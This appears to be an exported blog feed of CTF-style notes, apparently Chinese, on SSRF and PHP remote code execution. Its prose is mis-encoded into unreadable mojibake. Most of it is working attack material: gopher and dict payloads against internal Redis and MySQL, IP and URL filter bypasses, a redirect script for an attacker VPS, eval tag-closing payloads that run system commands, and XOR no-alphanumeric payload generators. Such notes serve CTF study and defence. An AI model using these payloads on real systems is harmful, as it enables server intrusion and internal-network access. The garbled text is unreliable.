    <content><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆServer Side Request Forgery, SSRFï¼‰æŒ‡çš„æ˜¯æ”»å‡»è€…åœ¨æœªèƒ½å–å¾—æœåŠ¡å™¨æ‰€æœ‰æƒé™æ—¶ï¼Œåˆ©ç”¨æœåŠ¡å™¨æ¼æ´ä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€‚SSRFæ”»å‡»é€šå¸¸é’ˆå¯¹å¤–éƒ¨ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚SSRFå¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œæ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ï¼Œæˆ–è€…åˆ©ç”¨Fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p>
<h1 id="å±é™©å‡½æ•°"><a href="#å±é™©å‡½æ•°" class="headerlink" title="å±é™©å‡½æ•°"></a>å±é™©å‡½æ•°</h1><p>ä¸‹é¢æ˜¯å‡ ä¸ªå¯èƒ½ä¼šå­˜åœ¨SSRFçš„æœåŠ¡å™¨ä½¿ç”¨çš„å‡½æ•°ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">file_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚<br>readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚<br>fsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ã€‚<br>curl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚<br>fopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URLã€‚<br></code></pre></td></tr></table></figure>

<p>example:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);  <span class="hljs-comment">//åˆ›é€ ä¸€ä¸ªcurlèµ„æº</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//è®¾ç½®urlå’Œç›¸åº”çš„é€‰é¡¹</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// æŠ“å–urlå¹¶å°†å…¶ä¼ é€’ç»™æµè§ˆå™¨</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//å…³é—­curlèµ„æº</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h1 id="å¸¸ç”¨åè®®"><a href="#å¸¸ç”¨åè®®" class="headerlink" title="å¸¸ç”¨åè®®"></a>å¸¸ç”¨åè®®</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>httpåè®®ç”¨äºè®¿é—®å†…ç½‘èµ„æº&#x2F;æ‰«æå†…ç½‘å­˜æ´»ä¸»æœº</p>
<p><img src="/img/summary/ssrf-1.png"></p>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>å¯ä»¥é€šè¿‡dictåè®®æ ¹æ®å“åº”æ—¶é—´å’Œå†…å®¹å»æ‰«æå†…ç½‘å¼€æ”¾ç«¯å£ä»¥åŠç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ä¿¡æ¯</p>
<p>example:<br><code>dict://127.0.0.1:6379 //æ¢æµ‹redisæ˜¯å¦å­˜æ´»</code></p>
<h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>fileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºçš„æ–‡ä»¶ï¼Œåœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨äºè¯»å–æ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹</p>
<p><img src="/img/summary/ssrf-2.png"></p>
<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>æ ¼å¼ï¼š<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCPæ•°æ®æµ&gt;</code></p>
<p>å¦‚æœå‘èµ·<code>post</code>è¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨<code>%0d%0a</code>ï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„<code>&amp;</code>ä¹Ÿéœ€è¦è¿›è¡Œ<code>URL</code>ç¼–ç </p>
<p><img src="/img/summary/ssrf-3.png"></p>
<p>é€šè¿‡è„šæœ¬è½¬æ¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /test.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">test=1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">#æ³¨æ„åé¢ä¸€å®šè¦æœ‰å›è½¦ï¼Œå›è½¦ç»“å°¾è¡¨ç¤ºhttpè¯·æ±‚ç»“æŸ</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>result = urllib.parse.quote(result)<br><span class="hljs-built_in">print</span>(result)       <span class="hljs-comment"># è¿™é‡Œå› ä¸ºæ˜¯GETè¯·æ±‚æ‰€ä»¥è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç </span><br></code></pre></td></tr></table></figure>

<h1 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h1><p>æ”»å‡»å†…ç½‘<code>Redis</code>ï¼Œ<code>FastCGI</code>ï¼Œ<code>MySql</code>ç­‰æœåŠ¡</p>
<p><a href="https://xz.aliyun.com/t/5665">æµ…æRedisä¸­SSRFçš„åˆ©ç”¨</a></p>
<p>åˆ©ç”¨<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>å·¥å…·</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>    If stored data is getting De-serialized by:<br>        Python<br>        Ruby<br>        PHP<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)<br></code></pre></td></tr></table></figure>

<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="ipé™åˆ¶"><a href="#ipé™åˆ¶" class="headerlink" title="ipé™åˆ¶"></a>ipé™åˆ¶</h2><p>ä¾‹å¦‚é™åˆ¶äº†<code>127/172</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">è¿›åˆ¶è½¬æ¢<br>10è¿›åˆ¶ http://2130706433<br>8è¿›åˆ¶ http://017700000001<br>16è¿›åˆ¶  http://0x7F000001<br><br>é•¿åº¦é™åˆ¶<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br><br>host&lt;3<br>url=http://0/flag.php  //åœ¨windowä¸‹ä»£è¡¨0.0.0.0ï¼Œè€Œåœ¨liunxä¸‹ä»£è¡¨127.0.0.1<br></code></pre></td></tr></table></figure>

<h2 id="urlé™åˆ¶"><a href="#urlé™åˆ¶" class="headerlink" title="urlé™åˆ¶"></a>urlé™åˆ¶</h2><blockquote>
<p>è§£æåˆ°å†…ç½‘çš„åŸŸå</p>
</blockquote>
<p><code>xip.io</code>ã€<code>xip.name</code>ã€<code>nip.io</code>ã€<code>sslip.io</code>ç­‰</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1<br>localhost &gt;&gt;&gt; 127.0.0.1<br></code></pre></td></tr></table></figure>

<blockquote>
<p>åˆ©ç”¨@è½¬è·³</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10<br></code></pre></td></tr></table></figure>

<blockquote>
<p>åˆ©ç”¨å¥å·</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1<br></code></pre></td></tr></table></figure>

<blockquote>
<p>åˆ©ç”¨IPv6[::]</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    //åœ¨liunxä¸‹å¯ç”¨<br></code></pre></td></tr></table></figure>

<blockquote>
<p>åˆ©ç”¨çŸ­ç½‘å€</p>
</blockquote>
<p>ä¸å…è®¸å‡ºç°æŸä¸ªå­—æ¯æˆ–è€…é™åˆ¶äº†urlé•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥åˆ‡æ¢ä¸ºçŸ­ç½‘å€ï¼Œæ¥ç»•è¿‡é•¿åº¦çš„é™åˆ¶</p>
<h2 id="302è·³è½¬"><a href="#302è·³è½¬" class="headerlink" title="302è·³è½¬"></a>302è·³è½¬</h2><p>vpsä¸Šæ”¾ä¸ªphp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$schema</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$ip</span>     = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;i&#x27;</span>];<br><span class="hljs-variable">$port</span>   = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$query</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$port</span>))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="enclosed-alphanumerics-ç»•è¿‡"><a href="#enclosed-alphanumerics-ç»•è¿‡" class="headerlink" title="enclosed alphanumerics ç»•è¿‡"></a>enclosed alphanumerics ç»•è¿‡</h2><p>ä¸€äº›ç½‘ç»œè®¿é—®å·¥å…·å¦‚Curlç­‰æ˜¯æ”¯æŒå›½é™…åŒ–åŸŸåï¼ˆInternationalized Domain Nameï¼ŒIDNï¼‰çš„ï¼Œå›½é™…åŒ–åŸŸååˆç§°ç‰¹æ®Šå­—ç¬¦åŸŸåï¼Œæ˜¯æŒ‡éƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨ç‰¹æ®Šçš„æ–‡å­—æˆ–å­—æ¯ç»„æˆçš„äº’è”ç½‘åŸŸåã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  example.com<br>List:<br>â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“  â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿<br></code></pre></td></tr></table></figure>

<h2 id="DNSé‡ç»‘å®š"><a href="#DNSé‡ç»‘å®š" class="headerlink" title="DNSé‡ç»‘å®š"></a>DNSé‡ç»‘å®š</h2><p><a href="https://xz.aliyun.com/t/7495">ä»0åˆ°1è®¤è¯†DNSé‡ç»‘å®šæ”»å‡»</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>RCEæ€»ç»“-ä»£ç æ‰§è¡Œ</title>
    <url>/posts/de69952b/</url>
    <content><![CDATA[<h1 id="ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œå‡½æ•°"></a>ä»£ç æ‰§è¡Œå‡½æ•°</h1><p><code>eval()</code>ï¼Œ<code>assert()</code>ï¼Œ<code>preg_replace()</code>ï¼Œ<code>create_function()</code>ï¼Œ<code>array_map()</code>ï¼Œ<code>call_user_func()</code>ï¼Œ<code>call_user_func_array()</code>ï¼Œ<code>array_filter()</code>ï¼Œ<code>uasort()</code>ï¼Œ<code>array_walk_recursive</code>ç­‰</p>
<h1 id="disable-functionsç»•è¿‡"><a href="#disable-functionsç»•è¿‡" class="headerlink" title="disable_functionsç»•è¿‡"></a>disable_functionsç»•è¿‡</h1><p>å¯ä»¥æ‰‹å·¥ç»•è¿‡æˆ–è€…é€šè¿‡èšå‰‘çš„æ’ä»¶</p>
<p><img src="/img/summary/rce-16.png"></p>
<p>å°trickï¼š<code>getå½¢å¼çš„ä»£ç æ‰§è¡Œå¯ä»¥ç”¨è½¬æ¥å¤´çš„å½¢å¼åœ¨èšå‰‘ä¸Šè¿æ¥ï¼Œä¾‹å¦‚/?1=assert($_POST[2]);</code></p>
<h1 id="æ ‡ç­¾é—­åˆç»•è¿‡"><a href="#æ ‡ç­¾é—­åˆç»•è¿‡" class="headerlink" title="æ ‡ç­¾é—­åˆç»•è¿‡"></a>æ ‡ç­¾é—­åˆç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|\;/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é—­åˆäº†æ ‡ç­¾ï¼Œé‚£å°±é€ ä¸€ä¸ªæ–°çš„æ ‡ç­¾<code>&lt;script language=&quot;php&quot;&gt;system(&#39;tac /f*&#39;)&lt;/script&gt;</code></p>
<p>å°trickï¼š<code>&lt;/script&gt;ç»“æŸæ ‡ç­¾è‡ªå¸¦ä¸€ä¸ª;</code></p>
<h1 id="æ ‡ç­¾é—­åˆ-é•¿åº¦é™åˆ¶"><a href="#æ ‡ç­¾é—­åˆ-é•¿åº¦é™åˆ¶" class="headerlink" title="æ ‡ç­¾é—­åˆ+é•¿åº¦é™åˆ¶"></a>æ ‡ç­¾é—­åˆ+é•¿åº¦é™åˆ¶</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&lt;=<span class="hljs-number">13</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ„é€ ä¸€ä¸ªå°äº13ä½çš„å‚æ•°ï¼š<code>&lt;?`$_GET[2]`;</code></p>
<p>ç„¶åå¯ä»¥åˆ©ç”¨<code>&amp;2</code>ä¼ å…¥åå¼¹shellçš„å‘½ä»¤ç­‰æ“ä½œ</p>
<p>æˆ–è€…åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹å¯ä»¥ç”¨<code>%0a</code>ç»•è¿‡æ³¨é‡Šç¬¦å·çš„é—­åˆ</p>
<h1 id="æ— å­—æ¯æ•°å­—ä»£ç æ‰§è¡Œ"><a href="#æ— å­—æ¯æ•°å­—ä»£ç æ‰§è¡Œ" class="headerlink" title="æ— å­—æ¯æ•°å­—ä»£ç æ‰§è¡Œ"></a>æ— å­—æ¯æ•°å­—ä»£ç æ‰§è¡Œ</h1><p>ä¹Ÿæ˜¯å¾ˆç»å…¸çš„ä¸€ç±»é¢˜ç›®ï¼Œå‚æ•°ä¸­ä¸èƒ½å‡ºç°å­—æ¯å’Œæ•°å­—<br>æ€è·¯å°±æ˜¯é€šè¿‡éå­—æ¯æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢æ„é€ å‡ºä»»æ„å­—æ¯ï¼Œç„¶åæ‹¼æ¥å‡ºå‡½æ•°æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure>

<h2 id="å¼‚æˆ–xor"><a href="#å¼‚æˆ–xor" class="headerlink" title="å¼‚æˆ–xor"></a>å¼‚æˆ–xor</h2><p>åœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œåï¼Œå¾—åˆ°çš„ä¾ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¯´å½“æˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯æ—¶ï¼Œå°±å¯ä»¥æ‰¾åˆ°ä¸¤ä¸ªéå­—æ¯æ•°å­—çš„å­—ç¬¦ï¼Œåªè¦ä»–ä»¬ä¿©çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚è€Œåœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢æˆasciiç å€¼ï¼Œå†å°†è¿™ä¸ªå€¼è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œç„¶åä¸€ä½ä¸€ä½çš„è¿›è¡ŒæŒ‰ä½å¼‚æˆ–ï¼Œå¼‚æˆ–çš„è§„åˆ™æ˜¯ï¼š<code>1^1=0,1^0=1,0^1=1,0^0=0</code>ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯ç›¸åŒä¸ºé›¶ï¼Œä¸åŒä¸ºä¸€</p>
<p>ä¾‹å¦‚<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)</code>ï¼Œå¼‚æˆ–åå¾—åˆ°<code>system</code></p>
<p><img src="/img/summary/rce-17.png"></p>
<p>yuå¸ˆå‚…çš„è„šæœ¬ï¼Œç”¨æ¥ç”Ÿæˆä¸€ä¸ªå­—å…¸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure>

<p>ç„¶åç”Ÿæˆpayload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># author yu22x</span><br><br><span class="hljs-comment"># import requests</span><br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your commandï¼š&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br><br></code></pre></td></tr></table></figure>


<p>ç„¶åç”¨<code>($a)();</code>çš„å½¢å¼æ‰§è¡Œä»£ç å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„<code>PHP7</code>å‰æ˜¯ä¸å…è®¸ç”¨<code>($a)();</code>è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„</p>
<p>è¡¥å……ï¼š<code>PHP&gt;8</code>å°±ä¸æ”¯æŒå°†æ²¡æœ‰å¼•å·åŒ…è£¹çš„å­—ç¬¦è§£æä¸ºå¯¹åº”å­—ç¬¦ä¸²äº†ï¼Œ<code>xx^yy</code>-&gt;<code>&#39;xx&#39;^&#39;yy&#39;</code>ï¼Œè¿™é‡Œ<code>x  y</code>ä»£è¡¨<code>ascii</code>å¤§äº<code>128</code>çš„å€¼</p>
